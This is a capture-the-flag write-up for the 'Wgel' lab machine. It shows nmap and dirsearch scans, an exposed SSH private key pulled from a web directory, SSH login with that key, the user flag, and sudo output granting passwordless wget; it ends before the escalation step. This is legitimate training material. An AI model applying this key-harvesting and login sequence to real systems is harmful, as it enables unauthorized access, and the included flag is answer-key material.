# Wgel CTF Write-up

## Recon

### Nmap 

`nmap -sV -sC 10.113.186.73`

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
    |   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
    |_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
    |_http-server-header: Apache/2.4.18 (Ubuntu)
    |_http-title: Apache2 Ubuntu Default Page: It works
    MAC Address: 06:9E:F2:B8:90:73 (Unknown)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

### Dirsearch

`dirsearch -u http://10.113.186.73/`

    301 -  316B  - /sitemap  ->  http://10.113.186.73/sitemap/
    
`dirsearch -u http://10.113.186.73/sitemap/`

    Starting: sitemap/
    301 -  319B  - /sitemap/js  ->  http://10.113.186.73/sitemap/js/
    200 -   14KB - /sitemap/.DS_Store
    200 -    2KB - /sitemap/.sass-cache/
    301 -  321B  - /sitemap/.ssh  ->  http://10.113.186.73/sitemap/.ssh/
    200 -  461B  - /sitemap/.ssh/
    200 -    2KB - /sitemap/.ssh/id_rsa
    200 -    3KB - /sitemap/about.html
    200 -    3KB - /sitemap/contact.html
    301 -  320B  - /sitemap/css  ->  http://10.113.186.73/sitemap/css/
    301 -  322B  - /sitemap/fonts  ->  http://10.113.186.73/sitemap/fonts/
    301 -  323B  - /sitemap/images  ->  http://10.113.186.73/sitemap/images/
    200 -    1KB - /sitemap/images/
    200 -  814B  - /sitemap/js/

http://10.113.186.73/sitemap/.ssh/id_rsa

<img width="507" height="434" alt="image" src="https://github.com/user-attachments/assets/b845453a-d29f-4f6e-99cf-9c20b25e5aad" />

chmod 600 id_rsa

sudo ssh -i ~/.ssh/id_rsa jessie@10.113.186.73

User flag:

    057c67131c3d5e42dd5cd3075b198ff6

## PrivEsc

`sudo -l`

    Matching Defaults entries for jessie on CorpOne:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User jessie may run the following commands on CorpOne:
        (ALL : ALL) ALL
        (root) NOPASSWD: /usr/bin/wget

